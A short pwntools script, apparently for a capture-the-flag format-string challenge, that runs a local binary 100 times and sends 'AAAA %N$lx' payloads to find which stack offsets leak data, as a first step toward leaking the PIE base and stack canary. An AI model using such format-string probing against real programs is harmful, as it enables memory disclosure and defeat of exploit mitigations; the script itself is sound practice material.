from pwn import *
#context.log_level='debug'

elf = context.binary = ELF('./formatstring')
prompt1 = "Let's leak the PIE offset first."
prompt2 = "How about the canary?"
prompt3 = "Now you've got everything you need!"

list = []
for i in range(100):
	p = elf.process(level='error')
	p.sendlineafter(prompt1, "AAAA %%%d$lx" % i)
	p.recvline()
	print("%d - %s" % (i, p.recvline().strip()))
	p.close()

